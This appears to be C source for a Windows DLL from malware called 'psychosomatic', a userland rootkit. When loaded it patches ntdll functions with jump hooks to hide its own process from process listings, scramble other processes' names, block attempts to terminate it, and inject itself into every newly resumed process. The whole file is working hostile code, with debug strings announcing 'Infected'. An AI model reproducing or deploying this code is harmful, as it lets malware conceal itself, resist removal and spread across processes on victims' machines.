#include <Windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <Psapi.h>
#include <SubAuth.h>
#include <TlHelp32.h>
#include <shlwapi.h>

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")

void* _AllocatePageNearAddress(void* targetAddr)
{
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	const UINT_PTR PAGE_SIZE = sysInfo.dwPageSize;

	UINT_PTR startAddr = ((UINT_PTR)(targetAddr) & ~(PAGE_SIZE - 1));
	UINT_PTR minAddr = min(startAddr - 0x7FFFFF00, (UINT_PTR)sysInfo.lpMinimumApplicationAddress);
	UINT_PTR maxAddr = max(startAddr + 0x7FFFFF00, (UINT_PTR)sysInfo.lpMaximumApplicationAddress);

	UINT_PTR startPage = (startAddr - (startAddr % PAGE_SIZE));

	UINT_PTR pageOffset = 1;
	while (1) {
		UINT_PTR byteOffset = pageOffset * PAGE_SIZE;
		UINT_PTR highAddr = startPage + byteOffset;
		UINT_PTR lowAddr = (startPage > byteOffset) ? startPage - byteOffset : 0;

		BOOL bQuit = highAddr > maxAddr && lowAddr < minAddr;

		if (highAddr < maxAddr)
		{
			PVOID pvRes = VirtualAlloc((void*)highAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (pvRes)
				return pvRes;
		}

		if (lowAddr > minAddr)
		{
			PVOID pvRes = VirtualAlloc((void*)lowAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (pvRes)
				return pvRes;
		}

		pageOffset++;

		if (bQuit)
			break;
		
	}

	return NULL;
}

UINT _WriteAbsoluteJump64(void* absJumpMemory, void* addrToJumpTo) {
	BYTE absJumpInstructions[] = { 0x49, 0xBA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, //mov 64 bit value into r10
										0x41, 0xFF, 0xE2 }; //jmp r10

	DWORD_PTR addrToJumpTo64 = (DWORD_PTR)addrToJumpTo;
	memcpy(&absJumpInstructions[2], &addrToJumpTo64, sizeof(addrToJumpTo64));
	memcpy(absJumpMemory, absJumpInstructions, sizeof(absJumpInstructions));
	return sizeof(absJumpInstructions);
}

typedef struct tagORIGINAL_FN_HOOK {
	PCHAR imageBase; // reserved
	DWORD_PTR function;
	BOOL bFound; // did function get found or not
} ORIGINAL_FN_HOOK;

typedef struct tagFUNCTION_HOOK {
	BYTE OriginalFirstBytes[5];
	BYTE JumpBytes[5];
	BOOL bSuccess;
	ORIGINAL_FN_HOOK originalFunction;
} FUNCTION_HOOK, * PFUNCTION_HOOK;

FUNCTION_HOOK HookFunction(PBYTE* pOriginalFunction, PBYTE* pNewFunction) {
	FUNCTION_HOOK fn;
	ZeroMemory(&fn, sizeof(fn));

	void* relayFuncMemory = _AllocatePageNearAddress(pOriginalFunction);
	if (!relayFuncMemory)
		return fn;
	_WriteAbsoluteJump64(relayFuncMemory, pNewFunction); //write relay func instructions

	//now that the relay function is built, we need to install the E9 jump into the target func,
	//this will jump to the relay function
	DWORD oldProtect;
	BOOL success = VirtualProtect(pOriginalFunction, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (!success) {
		SetLastError(ERROR_INVALID_ACCESS);
		return fn;
	}

	//32 bit relative jump opcode is E9, takes 1 32 bit operand for jump offset
	BYTE jmpInstruction[5] = { 0xE9, 0x0, 0x0, 0x0, 0x0 };

	//to fill out the last 4 bytes of jmpInstruction, we need the offset between 
	//the relay function and the instruction immediately AFTER the jmp instruction
	ULONG_PTR relAddr = (ULONG_PTR)relayFuncMemory - ((ULONG_PTR)pOriginalFunction + sizeof(jmpInstruction));
	memcpy(jmpInstruction + 1, &relAddr, 4);
	memcpy(fn.JumpBytes, jmpInstruction, 5);

	//install the hook
	memcpy(fn.OriginalFirstBytes, pOriginalFunction, sizeof(jmpInstruction));
	memcpy(pOriginalFunction, jmpInstruction, sizeof(jmpInstruction));
	fn.bSuccess = TRUE;
	return fn;
}

void FreeOriginalHookFunction(ORIGINAL_FN_HOOK* ptr) {
	FreeLibrary((HMODULE)ptr->imageBase);
	ZeroMemory(ptr, sizeof(ORIGINAL_FN_HOOK));
}

char* ImportReloadedTargetDLLCopy(char* dir, char* dllPath, char* tmpPath) {
	if (!GetWindowsDirectoryA(dir, MAX_PATH))
		return NULL;

	StringCchCatA(dir, MAX_PATH, tmpPath);

	if (!CopyFileA(dllPath, dir, FALSE))
		return NULL;
	return dir;
}

ORIGINAL_FN_HOOK ImportReloadedTargetDLL(char* dllPath, char* dllPTemp, char* function) {
	ORIGINAL_FN_HOOK res;
	CHAR dir[MAX_PATH] = { 0 };
	ZeroMemory(&res, sizeof(res));
	if (!GetWindowsDirectoryA(dir, MAX_PATH))
		return res;

	StringCchCatA(dir, MAX_PATH, dllPTemp);
	//ImportReloadedTargetDLLCopy(dllPath, dllPTemp);
	//printf("%s\n", dir);
	if ((!CopyFileA(dllPath, dir, TRUE)) && (!PathFileExistsA(dir)))
		return res;

	HMODULE lib = LoadLibraryA(dir);
	if (!lib) {
		printf("LoadLibraryA failed!\n");
		printf("Error: %lu\n", GetLastError());
		return res;
	}

	ULONG_PTR fn = (ULONG_PTR)GetProcAddress(lib, function);
	if (!fn) {
		FreeLibrary(lib);
		printf("Func not found\n");
		return res;
	}

	res.imageBase = (PCHAR)lib;
	res.function = (DWORD_PTR)fn;
	res.bFound = TRUE;
	return res;
}

FUNCTION_HOOK HookFunctionEx(LPCSTR dllName, LPCSTR functionName,
	PBYTE* pTargetFunction, PBYTE* pHookFunction) {
	FUNCTION_HOOK res = HookFunction(pTargetFunction, pHookFunction);
	if (!res.bSuccess)
		return res;
	//res.originalFunction = FindOriginalHookFunction(dllName, functionName);
	return res;
}

FUNCTION_HOOK NtResumeThreadHook;
typedef INT(WINAPI* MessageBoxAType)(HWND, LPCSTR, LPCSTR, UINT);

typedef enum __THREAD_INFORMATION_CLASS {
	ThreadBasicInformation,
	ThreadTimes,
	ThreadPriority,
	ThreadBasePriority,
	ThreadAffinityMask,
	ThreadImpersonationToken,
	ThreadDescriptorTableEntry,
	ThreadEnableAlignmentFaultFixup,
	ThreadEventPair,
	ThreadQuerySetWin32StartAddress,
	ThreadZeroTlsCell,
	ThreadPerformanceCount,
	ThreadAmILastThread,
	ThreadIdealProcessor,
	ThreadPriorityBoost,
	ThreadSetTlsArrayAddress,
	ThreadIsIoPending,
	ThreadHideFromDebugger
} THREAD_INFORMATION_CLASS, * PTHREAD_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* NtResumeThreadType)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* NtQueryInformationThreadType)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);

NtResumeThreadType NtResumeThreadOriginal = NULL;
NtQueryInformationThreadType NtQueryInformationThread = NULL;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _TEB {
	PVOID Reserved1[12];
	PVOID  ProcessEnvironmentBlock;
	PVOID Reserved2[399];
	BYTE  Reserved3[1952];
	PVOID TlsSlots[64];
	BYTE  Reserved4[8];
	PVOID Reserved5[26];
	PVOID ReservedForOle;
	PVOID Reserved6[4];
	PVOID TlsExpansionSlots;
} TEB, * PTEB;

typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS ExitStatus;
	PTEB TebBaseAddress;
	CLIENT_ID ClientId;
	ULONG_PTR AffinityMask;
	LONG Priority;
	LONG BasePriority;
} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;

CHAR dllName[MAX_PATH + 1];

typedef struct _COMMUNICATION_DATA {
	CHAR dllPath[MAX_PATH];
	DWORD pid;
	UINT msg;
} COMMUNICATION_DATA, * PCOMMUNICATION_DATA;

#define SystemProcessInformation 0x05

typedef struct _SYSTEM_PROCESS_INFO {
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
} SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

#define PSYCHOSOMATIC_COMMUNICATE WM_USER + 69
#define PSCOM_INJECT_DLL 0x1

int InjectDLL(DWORD pid) {
	COMMUNICATION_DATA data = { 0,0 };
	strcpy_s(data.dllPath, MAX_PATH, dllName);
	data.pid = pid;
	data.msg = PSCOM_INJECT_DLL;
	COPYDATASTRUCT cds;

	cds.cbData = sizeof(data);
	cds.dwData = PSCOM_INJECT_DLL;
	cds.lpData = &data;

	HWND hWnd = FindWindow(NULL, TEXT("Psychosomatic Interprocess Communication Handler"));
	if (!hWnd) {
		MessageBoxA(NULL, "PICH is offline", "Error", MB_ICONERROR);
		return 1;
	}

	SendMessage(hWnd,
		WM_COPYDATA,
		0ULL,
		(LPARAM)(LPVOID)&cds);

	SendMessageW(hWnd, PSYCHOSOMATIC_COMMUNICATE, 0, 0);
	return 0;
}

NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG res) {
	//CreateThread(NULL, 0, DispMsg, thread, 0, NULL);
	THREAD_BASIC_INFORMATION tbi = { 0 };

	if (NtQueryInformationThread(thread, 0, &tbi, sizeof(tbi), NULL) >= 0) {
		if (InjectDLL((DWORD)(DWORD_PTR)tbi.ClientId.UniqueProcess))
			MessageBoxA(NULL, "Unkown", "Failed to inject dll!", MB_ICONERROR);
	}

	return NtResumeThreadOriginal(thread, res);
}

typedef NTSTATUS(NTAPI* NtTerminateProcessType)(
	HANDLE   ProcessHandle,
	NTSTATUS ExitStatus
	);
typedef NTSTATUS(NTAPI* LdrUnloadDllType)(HANDLE ModuleHandle);


NtTerminateProcessType originalNtTerminateProcess = NULL;
LdrUnloadDllType originalLdrUnloadDll = NULL;

NTSTATUS NTAPI LdrUnloadDllHook(HANDLE moduleHandle) {
	NTSTATUS status = originalLdrUnloadDll(moduleHandle);
	if (!NT_SUCCESS(status))
		return status;
	__try {
		CHAR fn[MAX_PATH];
		if (GetModuleFileNameA(moduleHandle, fn, MAX_PATH))
			printf("%s\n", fn);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}
	return status;
}

NTSTATUS NTAPI NtTerminateProcessHook(HANDLE hProc, NTSTATUS exitStatus) {
	BOOL ShouldFail = FALSE;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);
	CHAR path[MAX_PATH];
	K32GetProcessImageFileNameA(hProc, path, MAX_PATH);
	LPSTR fname = PathFindFileNameA(path);
	// MessageBoxA(NULL, fname, "xd", MB_ICONASTERISK);
	if (!strcmp(fname, "psychosomatic.exe"))
		return STATUS_INVALID_HANDLE;
	return originalNtTerminateProcess(hProc, exitStatus);
}

typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(ULONG, PVOID, ULONG, PULONG);
static NtQuerySystemInformationFn originalNtQuerySystemInformation = NULL;
HMODULE lib = NULL;
NTSTATUS NTAPI hookedNtQuerySysInfo(ULONG SystemInformationClass, PVOID  SystemInformation,
	ULONG SystemInformationLength, PULONG ReturnLength);
INT ProcessFindEvasion();
int mainentry() {
	//MessageBoxA(NULL, "this process is infected :)", "trill", MB_ICONASTERISK);
	DWORD dwOldProtection = 0;
	CHAR fn[MAX_PATH];
	ImportReloadedTargetDLLCopy(fn, "C:\\windows\\system32\\ntdll.dll", "\\temp\\ntdll.dll");

	printf("Infected\n");

	lib = LoadLibraryA(fn);
	if (!lib)
		return TRUE;

	NtResumeThreadOriginal = (NtResumeThreadType)GetProcAddress(lib, "NtResumeThread");
	originalNtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(lib, "NtQuerySystemInformation");
	originalNtTerminateProcess = (NtTerminateProcessType)GetProcAddress(lib, "NtTerminateProcess");
	originalLdrUnloadDll = (LdrUnloadDllType)GetProcAddress(lib, "LdrUnloadDll");
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	if (!originalLdrUnloadDll) {
		MessageBoxA(NULL, "no original ldtrunbloadlib", "xb", MB_ICONASTERISK);
		return TRUE;
	}
	if (!originalNtQuerySystemInformation) {
		MessageBoxA(NULL, "no original NtQuerySystemInformation", "xb", MB_ICONASTERISK);
		return TRUE;
	}
	if (!originalNtTerminateProcess) {
		MessageBoxA(NULL, "no original nt terminate blah blah", "a", MB_ICONASTERISK);
		return TRUE;
	}
	if (!ntdll) {
		FreeLibrary(lib);
		return TRUE;
	}

	FARPROC ntsysinfo = GetProcAddress(ntdll, "NtQuerySystemInformation");
	FUNCTION_HOOK hookNtqs = HookFunction((PBYTE*)ntsysinfo, (PBYTE*)&hookedNtQuerySysInfo);
	if (!hookNtqs.bSuccess) {
		printf("No ntqsysinfo sucess\n");
		return TRUE;
	}
	FARPROC nttermproc = GetProcAddress(ntdll, "NtTerminateProcess");
	FUNCTION_HOOK hookNtmp = HookFunction((PBYTE*)nttermproc, (PBYTE*)&NtTerminateProcessHook);
	if (!hookNtmp.bSuccess) {
		MessageBoxA(NULL, "trampoiline hook failed", "NtTerminateProcess", MB_ICONASTERISK);
		return TRUE;
	}

	NtResumeThreadType NtResumeThread = (NtResumeThreadType)GetProcAddress(ntdll, "NtResumeThread");
	NtQueryInformationThread = (NtQueryInformationThreadType)GetProcAddress(ntdll, "NtQueryInformationThread");

	if (!NtQueryInformationThread) {
		MessageBoxA(NULL, "Failed to load NtQueryInformationThread", "ifykyk", MB_ICONERROR);
		FreeLibrary(lib);
		return TRUE;
	}

	NtResumeThreadHook = HookFunction((PBYTE*)NtResumeThread, (PBYTE*)&HookedNtResumeThread);
	if (!NtResumeThreadHook.bSuccess) {
		printf("fail\n");
		FreeLibrary(lib);
		return TRUE;
	}

	return 0;
}

NTSTATUS NTAPI hookedNtQuerySysInfo(ULONG SystemInformationClass, PVOID  SystemInformation,
	ULONG SystemInformationLength, PULONG ReturnLength) {
	NTSTATUS status = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);

	if (SystemInformationClass != SystemProcessInformation)
		return status;

	if (!NT_SUCCESS(status))
		return status;

	PSYSTEM_PROCESS_INFO pNow = NULL,
		pNext = (PSYSTEM_PROCESS_INFO)SystemInformation;

	do {
		pNow = pNext;

		if (!pNow->NextEntryOffset)
			break;

		pNext = (PSYSTEM_PROCESS_INFO)((DWORD_PTR)pNow + pNow->NextEntryOffset);
		if (!lstrcmpiW(pNext->ImageName.Buffer, L"psychosomatic.exe")) {
			if (pNext->NextEntryOffset)
				pNow->NextEntryOffset = 0;
			else
				pNow->NextEntryOffset = pNow->NextEntryOffset + pNext->NextEntryOffset;
		}
		else {
			// additional funnery payload
			PWSTR buf = pNext->ImageName.Buffer;
			WCHAR allowed[] = L"PSYCHOSOMATIC!?";
			UINT allowedSz = (UINT)wcslen(buf);
			INT i = 0;
			i += (GetTickCount() + rand()) % 5;
			while (*buf) {
				*buf = allowed[i % allowedSz];
				buf++;
				i++;
			}
			*buf = L'\0';
		}
	} while (pNow->NextEntryOffset);

	return status;
}

PIMAGE_THUNK_DATA FindFunctionThunk(PIMAGE_THUNK_DATA pOriginalThunk, PIMAGE_THUNK_DATA pFirstThunk,
	ULONG_PTR lpBase, const char* name) {
	for (; !(pOriginalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pOriginalThunk->u1.AddressOfData;
		pOriginalThunk++) {
		PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(lpBase + pOriginalThunk->u1.AddressOfData);
		if (!lstrcmpiA(name, (LPCSTR)pImportByName->Name))
			return pFirstThunk;
		pFirstThunk++;
	}
	return NULL;
}

INT ProcessFindEvasion() {
	MODULEINFO modInfo = { 0 };
	HMODULE hMod = GetModuleHandle(NULL);

	if (!GetModuleInformation(GetCurrentProcess(), hMod, &modInfo, sizeof(MODULEINFO))) {
		MessageBoxA(NULL, "no found GetModuleInformation :(", "zad", MB_ICONASTERISK);
		return TRUE;
	}
	ULONG_PTR lpBase = (DWORD_PTR)modInfo.lpBaseOfDll;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;

	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(lpBase + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)(&pNtHeader->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(lpBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	BOOL bFound = FALSE;

	for (; pImportDescriptor->Characteristics; pImportDescriptor++) {
		if (!lstrcmpiA("ntdll.dll", (LPCSTR)(lpBase + pImportDescriptor->Name))) {
			bFound = TRUE;
			break;
		}
	}

	if (!bFound) {
		printf("NTDLL not found\n");
		return TRUE;
	}

	PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)(lpBase + pImportDescriptor->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(lpBase + pImportDescriptor->FirstThunk);

	PIMAGE_THUNK_DATA ntQuerySysInfoThunk = FindFunctionThunk(pOriginalThunk, pFirstThunk,
		lpBase, "NtQuerySystemInformation");

	if (!ntQuerySysInfoThunk) {
		printf("NtQuerySystemInformation not found\n");
		return TRUE;
	}

	DWORD dwOldProtections = 0;

	VirtualProtect((void*)(&ntQuerySysInfoThunk->u1.Function), sizeof(DWORD_PTR), PAGE_READWRITE, &dwOldProtections);
	originalNtQuerySystemInformation = (NtQuerySystemInformationFn)ntQuerySysInfoThunk->u1.Function;
	ntQuerySysInfoThunk->u1.Function = (DWORD_PTR)hookedNtQuerySysInfo; // hook the func :)
	VirtualProtect((void*)(&ntQuerySysInfoThunk->u1.Function), sizeof(DWORD_PTR), dwOldProtections, &dwOldProtections);
	return 0;
}

BOOL WINAPI DllMain(
	HINSTANCE hInstance,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpvReserved)  // reserved
{
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		GetModuleFileNameA(hInstance, dllName, MAX_PATH);
		mainentry();
		break;

	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;

	case DLL_PROCESS_DETACH:

		if (lpvReserved != NULL)
		{
			break; // do not do cleanup if process termination scenario
		}

		// Perform any necessary cleanup.
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
